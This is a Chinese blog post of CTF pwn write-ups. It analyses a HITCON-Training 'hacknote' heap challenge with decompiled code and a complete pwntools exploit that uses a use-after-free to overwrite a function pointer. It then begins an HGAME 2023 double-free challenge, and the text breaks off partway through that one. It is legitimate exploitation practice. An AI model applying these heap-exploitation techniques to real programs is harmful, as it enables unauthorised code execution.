    <content type="html"><![CDATA[<h1 id="HITCON-training-lab-10-hacknote"><a href="#HITCON-training-lab-10-hacknote" class="headerlink" title="HITCON-training lab 10 hacknote"></a>HITCON-training lab 10 hacknote</h1><p>题目地址： <a href="https://github.com/scwuaptx/HITCON-Training/tree/master/LAB/lab10">HITCON-Training&#x2F;LAB&#x2F;lab10 at master · scwuaptx&#x2F;HITCON-Training</a> </p><p>由于不知道 libc 的版本，这里选择了2.23，不过高版本做法貌似也没有什么区别就是了</p><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs yaml">[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/yyyffff/桌面/hacknote1&#x27;</span><br>    <span class="hljs-attr">Arch:</span>       <span class="hljs-string">i386-32-little</span><br>    <span class="hljs-attr">RELRO:</span>      <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>      <span class="hljs-string">Canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>         <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>    <span class="hljs-attr">PIE:</span>        <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8047000)</span><br>    <span class="hljs-attr">Stripped:</span>   <span class="hljs-literal">No</span><br><br></code></pre></td></tr></table></figure><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v5 = __readgsdword(<span class="hljs-number">0x14u</span>);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      menu();<br>      read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4u</span>);<br>      v3 = atoi(buf);<br>      <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">break</span>;<br>      del_note();<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v3 &gt; <span class="hljs-number">2</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">3</span> )<br>      &#123;<br>        print_note();<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">4</span> )<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>LABEL_13:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid choice&quot;</span>);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">1</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_13;<br>      add_note();<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>写的很明白了</p><h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">add_note</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v0; <span class="hljs-comment">// ebx</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+Ch] [ebp-1Ch]</span><br>  <span class="hljs-type">int</span> size; <span class="hljs-comment">// [esp+10h] [ebp-18h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [esp+14h] [ebp-14h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span><br><br>  v5 = __readgsdword(<span class="hljs-number">0x14u</span>);<br>  <span class="hljs-keyword">if</span> ( count &lt;= <span class="hljs-number">5</span> )                             <span class="hljs-comment">// 最多五个堆块</span><br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">4</span>; ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( !*(&amp;notelist + i) )<span class="hljs-comment">//notelist是bss段地址</span><br>      &#123;<br>        *(&amp;notelist + i) = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8u</span>);<span class="hljs-comment">//先开辟一个管理堆块的</span><br>        <span class="hljs-keyword">if</span> ( !*(&amp;notelist + i) )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Alloca Error&quot;</span>);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        *(_DWORD *)*(&amp;notelist + i) = print_note_content;<span class="hljs-comment">// 存了一个指针，print中会用到</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Note size :&quot;</span>);<br>        read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8u</span>);<br>        size = atoi(buf);<br>        v0 = (<span class="hljs-type">int</span>)*(&amp;notelist + i);<br>        *(_DWORD *)(v0 + <span class="hljs-number">4</span>) = <span class="hljs-built_in">malloc</span>(size);<span class="hljs-comment">//分配我们要的大小</span><br>        <span class="hljs-keyword">if</span> ( !*((_DWORD *)*(&amp;notelist + i) + <span class="hljs-number">1</span>) )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Alloca Error&quot;</span>);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Content :&quot;</span>);<br>        read(<span class="hljs-number">0</span>, *((<span class="hljs-type">void</span> **)*(&amp;notelist + i) + <span class="hljs-number">1</span>), size);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success !&quot;</span>);<br>        ++count;<span class="hljs-comment">//计数+1</span><br>        <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14u</span>) ^ v5;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Full&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14u</span>) ^ v5;<br>&#125;<br></code></pre></td></tr></table></figure><p>具体如下</p><p><img src="/2025/08/02/%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/1754150913483.png" alt="1754150913483"></p><p>从左到右分别是 size pre_size chunk_ptr print_note_content</p><h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">del_note</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14u</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4u</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt;= count )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( *(&amp;notelist + v1) )<br>  &#123;<br>    <span class="hljs-built_in">free</span>(*((<span class="hljs-type">void</span> **)*(&amp;notelist + v1) + <span class="hljs-number">1</span>));<br>    <span class="hljs-built_in">free</span>(*(&amp;notelist + v1));<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14u</span>) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure><p>释放后没有置 0，存在 UAF</p><h3 id="print"><a href="#print" class="headerlink" title="print"></a>print</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">print_note</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14u</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4u</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt;= count )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( *(&amp;notelist + v1) )<br>    (*(<span class="hljs-type">void</span> (__cdecl **)(_DWORD))*(&amp;notelist + v1))(*(&amp;notelist + v1));<span class="hljs-comment">//调用指针来pirnt。其实这个指针就是我在add里存的那个</span><br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14u</span>) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="存在magic，后门函数"><a href="#存在magic，后门函数" class="headerlink" title="存在magic，后门函数"></a>存在magic，后门函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">magic</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;cat /home/hacknote/flag&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>在本地我自己创建了一个 flag 文件用于测试</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>由于是32位的程序，我堆块的大小和对齐方式和64位有些区别，需要注意一下</p><p>由于存在管理堆块的堆，并且 print 中有直接调用指针，而且这个指针还是堆上的，如果我们可以修改这个指针为 magic 函数的地址，那么就可以直接读取到 flag</p><p>具体操作如下</p><ul><li>首先 add 三个块，此时有三个大小为 8 字节的堆进行管理，接着 delete(0,1)</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;aa&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;aa&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;aa&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>现在 fastbins 大小为 0x8 内有 chunk1-&gt;chunk0&lt;-0（这几个 chunk 都是用来管理的）</p><ul><li>接着分配一个大小为 8 字节的堆块，此时分配两个大小为8字节的堆块，就会把两个管理堆块的堆分配走，由于 fastbins 是从头开始分配，所以我们可以修改的是 chunk0 的那个8字节管理的堆，我们将 print_note_content 指针修改为 magic，然后 view(0) 就可以得到 flag（由于 UAF ）</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">backdoor=<span class="hljs-number">0x08048986</span> <br>pause()<br>add(<span class="hljs-number">8</span>,p32(backdoor))<br><br>view(<span class="hljs-number">0</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><p><img src="/2025/08/02/%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/1754151431713.png"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>r=process(<span class="hljs-string">&#x27;./hacknote1&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;hoice :&quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;e :&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(size))<br>    r.recvuntil(<span class="hljs-string">&quot;nt :&quot;</span>)<br>    r.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;hoice :&quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">view</span>(<span class="hljs-params">idx</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;hoice :&quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;aa&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;aa&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;aa&#x27;</span>)<br>pause()<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>backdoor=<span class="hljs-number">0x08048986</span> <br>pause()<br>add(<span class="hljs-number">8</span>,p32(backdoor))<br><br>view(<span class="hljs-number">0</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h1 id="HGAME-2023-week2-new-fast-note"><a href="#HGAME-2023-week2-new-fast-note" class="headerlink" title="[HGAME 2023 week2]new_fast_note"></a>[HGAME 2023 week2]new_fast_note</h1><h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><p>double-free tcache</p><h2 id="checksec-1"><a href="#checksec-1" class="headerlink" title="checksec"></a>checksec</h2><p>全开</p><p>glibc-2.31</p><h2 id="IDA-1"><a href="#IDA-1" class="headerlink" title="IDA"></a>IDA</h2><h3 id="main-1"><a href="#main-1" class="headerlink" title="main"></a>main</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// local variable allocation has failed, the output may be wrong!</span><br><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+14h] [rbp-Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  init(argc, argv, envp);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    menu(*(_QWORD *)&amp;argc);<br>    *(_QWORD *)&amp;argc = <span class="hljs-string">&quot;%d&quot;</span>;<br>    __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v3);<br>    <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">4</span> )<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> ( v3 &gt; <span class="hljs-number">4</span> )<br>    &#123;<br>LABEL_12:<br>      *(_QWORD *)&amp;argc = <span class="hljs-string">&quot;Wrong choice!&quot;</span>;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Wrong choice!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">switch</span> ( v3 )<br>      &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>          show_note();<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>          add_note(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v3);<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>          delete_note(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v3);<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>          <span class="hljs-keyword">goto</span> LABEL_12;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>菜单题</p><h3 id="add-1"><a href="#add-1" class="headerlink" title="add"></a>add</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">add_note</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// ebx</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br>  _DWORD size[<span class="hljs-number">7</span>]; <span class="hljs-comment">// [rsp+4h] [rbp-1Ch] BYREF</span><br><br>  *(_QWORD *)&amp;size[<span class="hljs-number">1</span>] = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index: &quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%u&quot;</span>, &amp;v3);<br>  <span class="hljs-keyword">if</span> ( v3 &lt;= <span class="hljs-number">0x13</span> )                             <span class="hljs-comment">// 发现其不会检测notes上是否以及存在指针了，所以我们可以重复使用</span><br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Size: &quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%u&quot;</span>, size);<br>    <span class="hljs-keyword">if</span> ( size[<span class="hljs-number">0</span>] &lt;= <span class="hljs-number">0xFFu</span> )<br>    &#123;<br>      v1 = v3;<br>      *((_QWORD *)&amp;notes + v1) = <span class="hljs-built_in">malloc</span>(size[<span class="hljs-number">0</span>]);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Content: &quot;</span>);<br>      read(<span class="hljs-number">0</span>, *((<span class="hljs-type">void</span> **)&amp;notes + v3), size[<span class="hljs-number">0</span>]);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Too big.&quot;</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;There are only 20 pages in this notebook.&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ *(_QWORD *)&amp;size[<span class="hljs-number">1</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>看起来最多只能分配0x13个堆，但是其并不会检查该notes上是否以及存在堆块了，所以可以无限分配，size 也是随便</p><h3 id="delete-1"><a href="#delete-1" class="headerlink" title="delete"></a>delete</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">delete_note</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+4h] [rbp-Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index: &quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%u&quot;</span>, &amp;v2);<br>  <span class="hljs-keyword">if</span> ( v2 &lt;= <span class="hljs-number">0xF</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( *((_QWORD *)&amp;notes + v2) )<br>      <span class="hljs-built_in">free</span>(*((<span class="hljs-type">void</span> **)&amp;notes + v2));<br>    <span class="hljs-keyword">else</span><br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Page not found.&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;There are only 16 pages in this notebook.&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure><p>非常明显的UAF</p><h3 id="show"><a href="#show" class="headerlink" title="show"></a>show</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 